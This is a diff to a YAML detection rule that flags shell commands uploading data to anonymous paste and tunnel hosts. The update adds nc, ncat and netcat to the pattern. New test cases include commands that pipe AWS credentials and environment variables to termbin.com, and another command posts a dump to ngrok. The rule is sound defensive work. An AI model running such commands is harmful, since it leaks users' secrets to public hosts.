@@ -1,5 +1,5 @@
 id: upload-to-paste-transfer-site
-version: 1
+version: 2
 title: Upload to an anonymous paste/transfer/tunnel host
 description: >
   A command POSTs or uploads file content to a well-known anonymous file-drop,
@@ -19,7 +19,7 @@ taxonomy:
 
 match: >
   e.event.action == "command.executed" &&
-  e.command.command.matches("(?i)\\b(curl|wget|http|httpie)\\b") &&
+  e.command.command.matches("(?i)\\b(curl|wget|http|httpie|nc|ncat|netcat)\\b") &&
   e.command.command.matches("(?i)\\b(transfer\\.sh|0x0\\.st|file\\.io|pastebin\\.com|paste\\.rs|bashupload\\.com|termbin\\.com|gofile\\.io|catbox\\.moe|oshi\\.at|ngrok\\.(io|app|dev)|trycloudflare\\.com)\\b")
 
 emit:
@@ -43,6 +43,24 @@ tests:
     events:
       - event: { action: command.executed }
         command: { command: "curl -X POST -d @dump.json https://abc123.ngrok.app/in" }
+        session: { id: s1 }
+  - name: nc_termbin
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "cat ~/.aws/credentials | nc termbin.com 9999" }
+        session: { id: s1 }
+  - name: ncat_termbin
+    verdict: match
+    events:
+      - event: { action: command.executed }
+        command: { command: "env | ncat termbin.com 9999" }
+        session: { id: s1 }
+  - name: nc_ordinary_host
+    verdict: no_match
+    events:
+      - event: { action: command.executed }
+        command: { command: "nc -z localhost 5432" }
         session: { id: s1 }
   - name: benign_github_curl
     verdict: no_match
